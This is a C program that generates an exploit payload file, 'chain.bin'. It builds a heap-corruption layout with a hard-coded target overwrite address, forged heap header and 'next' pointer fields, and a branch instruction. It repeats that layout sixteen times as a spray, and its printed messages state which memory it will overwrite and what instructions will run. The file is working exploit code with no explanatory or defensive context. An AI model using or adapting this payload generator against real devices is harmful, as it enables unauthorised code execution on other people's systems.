#include <stdio.h>
#include <stdint.h>

uint32_t invert_byteorder(uint32_t data)
{
    return (data & 0x000000FF) << 24u | (data & 0x0000FF00) << 8u |
           (data & 0x00FF0000) >> 8u | (data & 0xFF000000) >> 24u;
}

int main(int argc, char *argv[])
{
    uint32_t target_overwrite = 0x80DFF5BC;
    uint32_t marker = 0xDEADBEEF;
    uint32_t heap_header = 0x706F6E79;
    uint32_t bigint_next = 0x6E657874;
    uint32_t bigint_k = (target_overwrite - 0x81703d64) >> 2;
    uint32_t relative_jump = 0x48000028;
    uint32_t null_bytes = 0x00000000;

    size_t chain_iterations = 16;

    uint32_t chain_layout[] = {
        marker,
        0x00000000,
        0x00000000,
        0x00000000,
        heap_header,
        bigint_next,
        bigint_k,
        relative_jump,
        0x00000000,
        0x00000000
    };

    printf("Overwrite will be at 0x%X\n", target_overwrite);
    printf("Instructions executed will be *(0x%X) 0x%X 0x%X\n", target_overwrite, bigint_k, relative_jump);

    FILE *chain = fopen("chain.bin", "wb");
    if (!chain)
    {
        printf("Error opening chain.bin\n");
        return 1;
    }

    for (size_t i = 0; i < sizeof(chain_layout) / sizeof(uint32_t); i++)
    {
        chain_layout[i] = invert_byteorder(chain_layout[i]);
    }

    for (size_t i = 0; i < chain_iterations; i++)
    {
        fwrite(chain_layout, sizeof(chain_layout), 1, chain);
    }

    fwrite(&null_bytes, 4, 1, chain);
    fwrite(&null_bytes, 4, 1, chain);
    fwrite(&null_bytes, 4, 1, chain);
    fwrite(&null_bytes, 4, 1, chain);
    fwrite(&null_bytes, 4, 1, chain);
    fwrite(&null_bytes, 4, 1, chain);
    fwrite(&null_bytes, 4, 1, chain);

    fclose(chain);

    return 0;
}
